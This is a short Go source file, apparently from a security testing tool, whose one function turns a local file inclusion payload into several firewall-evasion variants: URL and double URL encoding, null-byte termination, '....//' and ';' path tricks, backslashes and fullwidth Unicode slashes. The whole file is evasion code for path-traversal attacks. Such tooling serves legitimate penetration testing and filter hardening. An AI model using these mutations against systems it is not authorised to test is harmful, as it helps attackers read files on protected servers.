package mutations

import (
	"net/url"
	"strings"
)

// GetMutations generates WAF bypass variations for a given LFI payload.
// Each technique targets a different category of server-side or WAF normalization behavior.
func GetMutations(payload string) []string {
	return []string{
		// --- Baseline ---
		payload, // Raw, unmodified payload

		// --- URL Encoding ---
		url.QueryEscape(payload),                  // Single URL encode  (e.g., ../ → ..%2F)
		url.QueryEscape(url.QueryEscape(payload)), // Double URL encode  (e.g., ../ → ..%252F)

		// --- Null Byte ---
		// Terminates the string in older PHP/C-based file systems.
		payload + "%00",

		// --- Path Filter Bypass ---
		// WAFs that strip "../" leave "....//", which collapses back to "../".
		strings.ReplaceAll(payload, "../", "....//"),

		// --- Backslash Bypass ---
		// Windows hosts and some WAFs treat \ and / interchangeably.
		strings.ReplaceAll(payload, "/", "\\"),

		// --- Semicolon Separator Bypass ---
		// Targets Java servlet path handling: /foo;ignored/../bar
		strings.ReplaceAll(payload, "../", "..;/"),

		// --- Unicode Fullwidth Slash ---
		// Some WAFs decode %2F and / but not their Unicode lookalikes.
		strings.ReplaceAll(payload, "/", "%ef%bc%8f"),
	}
}
